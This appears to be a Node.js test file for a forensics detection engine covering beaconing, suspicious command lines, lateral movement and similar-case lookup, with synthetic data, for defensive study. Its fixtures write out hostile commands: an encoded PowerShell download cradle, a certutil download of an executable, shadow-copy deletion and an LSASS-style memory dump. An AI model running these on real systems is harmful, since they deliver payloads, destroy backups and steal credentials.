// Copyright (c) 2026 Citynet Work and Zyberon Information Technology, Saudi Arabia. All rights reserved. Proprietary and confidential - see LICENSE.
'use strict';
// DFIR machine learning (engine/dfir/ml.js, wired into forensics.js analyse() and the routes): beaconing by inter-arrival
// regularity (regular external contacts found, jittered / random ones and too-fast periods left out), command lines scored on
// named features (encoded PowerShell, download cradle, LOLBin, Office -> shell, entropy, shadow-copy deletion, credential
// dumping) with benign lines left alone, rare parent -> child pairs, lateral-movement fan-out (failed logons do not count), the
// ATT&CK roll-up, the itemised attention score, and "cases like this one" (weighted Jaccard, shared items named, how closed
// matches ended) through GET /dfir/cases/:id/similar - analyst and above, audited, 404 for an unknown case. SYNTHETIC data only.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const ML = require('../engine/dfir/ml');
const { analyse } = require('../engine/dfir/forensics');
const { createState } = require('../engine/soc/state');
const { createAlerts } = require('../engine/soc/alerts');
const { createCases } = require('../engine/soc/cases');
const routes = require('../engine/dfir/routes');
const { fakeApi, tmpDir, quietLog } = require('./soc-fakes');

const MIN = 60e3, H = 3600e3, T0 = Date.parse('2026-11-14T06:00:00Z');
const iso = (t) => new Date(t).toISOString();
const net = (t, dst) => ({ t, ts: iso(t), lane: 'network', dst_ip: dst, host: 'pc-syn-4', src_ip: '10.4.0.4' });
const exe = (t, process, parent, cmdline) => ({ t, ts: iso(t), lane: 'execution', process, parent_process: parent, cmdline, host: 'pc-syn-4', user: 'omar.syn' });
// a deterministic pseudo-random stream so the "random traffic" case is the same every run
function rng(seed) { let s = seed; return () => { s = (s * 1103515245 + 12345) % 2147483648; return s / 2147483648; }; }

test('beacons: regular external contacts are found with period and jitter; random, too fast and too few are not', () => {
  const r = rng(7), ev = [];
  for (let i = 0; i < 12; i++) ev.push(net(T0 + i * 5 * MIN + Math.round((r() - 0.5) * 20e3), '198.51.100.77'));          // every 5 min, +-10 s
  let t = T0; for (let i = 0; i < 12; i++) { t += Math.round(r() * 40 * MIN) + 10e3; ev.push(net(t, '203.0.113.9')); }      // random gaps
  for (let i = 0; i < 12; i++) ev.push(net(T0 + i * 2e3, '203.0.113.10'));                                                // every 2 s: too fast
  for (let i = 0; i < 4; i++) ev.push(net(T0 + i * 10 * MIN, '203.0.113.11'));                                             // only 4 contacts
  for (let i = 0; i < 8; i++) ev.push(net(T0 + i * 15 * MIN, '10.1.1.5'));                                                // internal, regular
  const b = ML.beacons(ev);
  assert.deepEqual(b.map((x) => x.destination), ['198.51.100.77', '10.1.1.5'], 'external first: ' + JSON.stringify(b));
  assert.equal(b[0].contacts, 12); assert.ok(Math.abs(b[0].period_s - 300) <= 15); assert.ok(b[0].jitter_pct <= 10); assert.equal(b[0].external, true); assert.equal(b[1].external, false);
  assert.match(b[0].why, /12 contacts every ~5 min/);
  const dns = []; for (let i = 0; i < 8; i++) dns.push({ t: T0 + i * H, lane: 'dns', dns_query: 'Upd-Syn.Example' });
  assert.equal(ML.beacons(dns)[0].destination, 'upd-syn.example', 'DNS names are grouped case-insensitively');
});

test('command lines: each feature named with its points; ordinary commands are not flagged', () => {
  const enc = 'powershell.exe -nop -w hidden -enc ' + 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA';
  const ev = [
    exe(T0, 'powershell.exe', 'winword.exe', enc),
    exe(T0 + MIN, 'certutil.exe', 'cmd.exe', 'certutil.exe -urlcache -split -f http://203.0.113.5/a.txt a.exe'),
    exe(T0 + 2 * MIN, 'vssadmin.exe', 'cmd.exe', 'vssadmin.exe delete shadows /all /quiet'),
    exe(T0 + 3 * MIN, 'rundll32.exe', 'cmd.exe', 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full'),
    exe(T0 + 4 * MIN, 'notepad.exe', 'explorer.exe', 'notepad.exe C:\\Users\\omar.syn\\notes.txt'),
    exe(T0 + 5 * MIN, 'git.exe', 'cmd.exe', 'git.exe pull origin main'),
    exe(T0 + 6 * MIN, 'powershell.exe', 'winword.exe', enc),
  ];
  const c = ML.commands(ev);
  assert.equal(c.length, 4, 'notepad and git are ordinary: ' + c.map((x) => x.process).join(','));
  const ps = c.find((x) => x.process === 'powershell.exe');
  assert.equal(ps.count, 2, 'the same command line is one finding with a count');
  assert.deepEqual(ps.features.map((f) => f.feature).sort(), ['encoded PowerShell', 'hidden / policy-bypass PowerShell', 'started by winword.exe (a document, mail or browser process starting a shell)'].sort());
  assert.equal(ps.score, 65);
  assert.ok(c.find((x) => x.process === 'certutil.exe').features.some((f) => f.feature === 'download cradle' && f.technique === 'T1105'));
  assert.ok(c.find((x) => x.process === 'vssadmin.exe').features.some((f) => f.technique === 'T1490'));
  assert.ok(c.find((x) => x.process === 'rundll32.exe').features.some((f) => f.feature === 'credential dumping'));
  const obf = 'cmd.exe /c ' + Array.from({ length: 120 }, (_, i) => String.fromCharCode(33 + ((i * 37) % 90))).join('');
  assert.ok(ML.commands([exe(T0, 'cmd.exe', 'explorer.exe', obf)])[0].features.some((f) => /entropy/.test(f.feature)), 'obfuscated by entropy');
  assert.ok(ML.entropy('aaaa') === 0 && ML.entropy('abcd') === 2);
});

test('rare parent -> child pairs, lateral movement fan-out, ATT&CK roll-up and the itemised score', () => {
  const ev = [];
  for (let i = 0; i < 6; i++) ev.push(exe(T0 + i * MIN, 'chrome.exe', 'explorer.exe', ''), exe(T0 + i * MIN, 'outlook.exe', 'explorer.exe', ''));
  ev.push(exe(T0 + 10 * MIN, 'teams.exe', 'explorer.exe', ''), exe(T0 + 11 * MIN, 'excel.exe', 'explorer.exe', ''), exe(T0 + 12 * MIN, 'cmd.exe', 'excel.exe', 'cmd.exe /c whoami'));
  const rp = ML.parentChild(ev); assert.equal(rp[0].pair, 'excel.exe -> cmd.exe', 'a rare pair whose child is a shell first'); assert.equal(rp[0].shell, true);
  const au = (t, host, extra) => Object.assign({ t, ts: iso(t), lane: 'auth', src_ip: '10.4.0.4', host, target_user: 'adm.syn', outcome: 'success', fields: { logon_type: '3' } }, extra || {});
  const lat = ML.lateral([au(T0, 'srv-a'), au(T0 + 10 * MIN, 'srv-b'), au(T0 + 20 * MIN, 'srv-c'), au(T0 + 25 * MIN, 'srv-d', { outcome: 'failure' }), au(T0 + 30 * MIN, 'srv-e', { fields: { logon_type: '2' } })]);
  assert.equal(lat.length, 1); assert.deepEqual(lat[0].hosts.map((h) => h.host), ['srv-a', 'srv-b', 'srv-c'], 'a failed or an interactive logon is not lateral movement');
  assert.match(lat[0].why, /10\.4\.0\.4 logged on to 3 hosts within 20 min/);
  assert.equal(ML.lateral([au(T0, 'srv-a'), au(T0 + 2 * H, 'srv-b'), au(T0 + 4 * H, 'srv-c')]).length, 0, 'spread over hours is not a fan-out');
  // the whole pipeline
  const all = ev.concat([au(T0, 'srv-a'), au(T0 + 10 * MIN, 'srv-b'), au(T0 + 20 * MIN, 'srv-c')]);
  for (let i = 0; i < 10; i++) all.push(net(T0 + i * 10 * MIN, '198.51.100.77'));
  all.push(exe(T0 + 40 * MIN, 'powershell.exe', 'winword.exe', 'powershell.exe -enc ' + 'A'.repeat(40)));
  const a = analyse(all.map((x) => Object.assign({}, x, { t: undefined })), { subject: 'pc-syn-4' });
  assert.equal(a.beacons[0].destination, '198.51.100.77'); assert.equal(a.lateral.length, 1); assert.ok(a.commands.length >= 1);
  assert.deepEqual(a.techniques.map((x) => x.id).sort(), ['T1021', 'T1059.001', 'T1071', 'T1204'].sort());
  for (const re of [/regular beacon/, /suspicious command line/, /lateral movement fan-out/, /rare parent -> shell/]) assert.ok(a.reasons.some((r) => re.test(r.why)), String(re));
  assert.equal(a.score, Math.min(100, a.reasons.reduce((s, r) => s + r.points, 0)), 'every point itemised');
  const e0 = analyse([]); assert.deepEqual([e0.beacons, e0.commands, e0.lateral, e0.techniques], [[], [], [], []]);
});

test('similar cases: shared items named, closed matches show how they ended; route roles, audit, 404', async () => {
  const dir = tmpDir(), state = createState({ dir, log: quietLog }), alerts = createAlerts({ state, log: quietLog }), cases = createCases({ state, alerts, log: quietLog });
  try {
    const api = fakeApi({ realRanks: true }); routes.register(api, { state, alerts, cases, config: { soc_analyst: {} }, log: quietLog, search: async () => ({ rows: [] }) });
    const al = (rule, host, mitre) => alerts.raise({ rule_id: rule, rule_name: rule, severity: 3, group: { host }, fields: {}, summary: 'synthetic', ts_first: T0, ts_last: T0, source: 'engine', count: 1, mitre }).alert.id;
    const cur = cases.create({ title: 'Encoded PowerShell on pc-syn-4 (synthetic)', alert_ids: [al('SENTRA-EXEC-ENC', 'pc-syn-4', ['T1059.001'])] }, 'nora.syn');
    const old = cases.create({ title: 'Encoded PowerShell on pc-syn-9 (synthetic)', alert_ids: [al('SENTRA-EXEC-ENC', 'pc-syn-9', ['T1059.001'])] }, 'nora.syn');
    cases.setStatus(old.id, 'closed', 'nora.syn', { resolution: 'true-positive', note: 'macro dropper, reimaged' });
    const same = cases.create({ title: 'Other activity on pc-syn-4 (synthetic)', alert_ids: [al('SENTRA-NET-SCAN', 'pc-syn-4', ['T1046'])] }, 'nora.syn');
    cases.create({ title: 'Unrelated (synthetic)', alert_ids: [al('SENTRA-MAIL-FWD', 'pc-syn-1', ['T1114'])] }, 'nora.syn');
    assert.equal((await api.call('GET', '/api/soc/dfir/cases/' + cur.id + '/similar', { role: 'viewer' })).status, 403, 'other cases name people and hosts');
    const r = await api.call('GET', '/api/soc/dfir/cases/' + cur.id + '/similar', { role: 'analyst', user: 'ali.syn' }); assert.equal(r.status, 200, JSON.stringify(r.body));
    const ids = r.body.items.map((x) => x.id); assert.deepEqual(ids.sort(), [old.id, same.id].sort(), 'the unrelated case is not similar');
    const o = r.body.items.find((x) => x.id === old.id);
    assert.ok(o.why.some((w) => w.on === 'rules' && w.shared.includes('SENTRA-EXEC-ENC')) && o.why.some((w) => w.on === 'techniques' && w.shared.includes('T1059.001')));
    assert.equal(o.resolution, 'true-positive'); assert.ok(o.hours_to_close != null);
    assert.ok(r.body.items.find((x) => x.id === same.id).why.some((w) => w.on === 'entities' && w.shared.includes('host:pc-syn-4')));
    assert.deepEqual(r.body.outcome.by_resolution, { 'true-positive': 1 }); assert.match(r.body.note, /never a reason to close/);
    assert.ok(api.audits.some((a) => a.action === 'dfir.similar' && a.target === cur.id && a.detail.matches === 2));
    assert.equal((await api.call('GET', '/api/soc/dfir/cases/CASE-999999/similar', { role: 'analyst' })).status, 404);
    assert.equal((await api.call('GET', '/api/soc/dfir/cases/bad$id/similar', { role: 'analyst' })).status, 400);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});
